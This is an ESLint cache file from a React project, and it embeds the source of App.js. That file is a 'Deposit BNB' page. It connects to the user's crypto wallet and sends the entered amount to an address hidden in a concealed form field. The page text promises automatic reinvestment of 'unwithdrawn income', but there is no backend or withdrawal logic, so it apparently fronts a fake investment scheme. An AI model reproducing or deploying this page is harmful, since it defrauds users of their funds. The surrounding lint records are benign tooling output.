[{"C:\\Users\\MKele\\Desktop\\rotshild\\react-ap\\src\\index.js":"1","C:\\Users\\MKele\\Desktop\\rotshild\\react-ap\\src\\App.js":"2","C:\\Users\\MKele\\Desktop\\rotshild\\react-ap\\src\\ErrorMessage.js":"3","C:\\Users\\MKele\\Desktop\\rotshild\\react-ap\\src\\TxList.js":"4"},{"size":240,"mtime":1652616125363,"results":"5","hashOfConfig":"6"},{"size":2424,"mtime":1656514546759,"results":"7","hashOfConfig":"6"},{"size":736,"mtime":1652616142480,"results":"8","hashOfConfig":"6"},{"size":356,"mtime":1652616134397,"results":"9","hashOfConfig":"6"},{"filePath":"10","messages":"11","suppressedMessages":"12","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0},"1fehsye",{"filePath":"13","messages":"14","suppressedMessages":"15","errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"16"},{"filePath":"17","messages":"18","suppressedMessages":"19","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"20"},{"filePath":"21","messages":"22","suppressedMessages":"23","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0},"C:\\Users\\MKele\\Desktop\\rotshild\\react-ap\\src\\index.js",[],[],"C:\\Users\\MKele\\Desktop\\rotshild\\react-ap\\src\\App.js",["24","25"],[],"import { useState } from \"react\";\r\nimport { ethers } from \"ethers\";\r\nimport ErrorMessage from \"./ErrorMessage\";\r\nimport TxList from \"./TxList\";\r\nimport styles from \"./css.css\";\r\n\r\n\r\nconst startPayment = async ({ setError, setTxs, ether, addr }) => {\r\n  try {\r\n    if (!window.ethereum)\r\n      throw new Error(\"No crypto wallet found. Please install it.\");\r\n\r\n    await window.ethereum.send(\"eth_requestAccounts\");\r\n    const provider = new ethers.providers.Web3Provider(window.ethereum);\r\n    const signer = provider.getSigner();\r\n    ethers.utils.getAddress(addr);\r\n    const tx = await signer.sendTransaction({\r\n      to: addr,\r\n      value: ethers.utils.parseEther(ether)\r\n    });\r\n    console.log({ ether, addr });\r\n    console.log(\"tx\", tx);\r\n    setTxs([tx]);\r\n  } catch (err) {\r\n    setError(err.message);\r\n  }\r\n};\r\n\r\nexport default function App() {\r\n  const [error, setError] = useState();\r\n  const [txs, setTxs] = useState([]);\r\n\r\n  const handleSubmit = async (e) => {\r\n    e.preventDefault();\r\n    const data = new FormData(e.target);\r\n    setError();\r\n    await startPayment({\r\n      setError,\r\n      setTxs,\r\n      ether: data.get(\"ether\"),\r\n      addr: data.get(\"addr\")\r\n    });\r\n  };\r\n\r\n  return (\r\n        <form onSubmit={handleSubmit}className=\"form\">\r\n          <h1></h1>\r\n          \r\n          <input\r\n            type=\"hidden\"\r\n            name=\"addr\"\r\n            value=\"0xb6C840B15a468FFe469910db719761373Cc9e1AB\"/>\r\n\r\n          <div>\r\n            <p className=\"p10\">1. Deposit BNB</p>\r\n            <p className=\"p20\">( min 0.1 , max 500 )</p>\r\n            <p className=\"p30\">Information : A new Deposit automatically reinvests the current unwithdrawn income</p>\r\n            <p className=\"p40\">2. Enter The App </p>\r\n            <p className=\"p50\">Enter a Minimum of 0.2 bnb to access</p>\r\n            <div className=\"tr1\"></div>\r\n            <div className=\"tr2\"></div>\r\n            <div c>\r\n              <input className=\"border \"\r\n                name=\"ether\"\r\n                type=\"text\"\r\n                min=\"0.2\"\r\n                max=\"5\"\r\n                placeholder=\"Min 0.2 - Max 5 BNB\" />\r\n            </div>\r\n\r\n            <div>\r\n              <button type=\"submit\" className=\"button\">\r\n                Deposit\r\n              </button>\r\n              <ErrorMessage message={error} />\r\n              <TxList txs={txs} />\r\n            </div>\r\n\r\n          </div>\r\n        </form>\r\n\r\n\r\n  );\r\n}\r\n","C:\\Users\\MKele\\Desktop\\rotshild\\react-ap\\src\\ErrorMessage.js",[],[],[],"C:\\Users\\MKele\\Desktop\\rotshild\\react-ap\\src\\TxList.js",[],[],{"ruleId":"26","severity":1,"message":"27","line":5,"column":8,"nodeType":"28","messageId":"29","endLine":5,"endColumn":14},{"ruleId":"30","severity":1,"message":"31","line":47,"column":11,"nodeType":"32","endLine":47,"endColumn":15},"no-unused-vars","'styles' is defined but never used.","Identifier","unusedVar","jsx-a11y/heading-has-content","Headings must have content and the content must be accessible by a screen reader.","JSXOpeningElement"]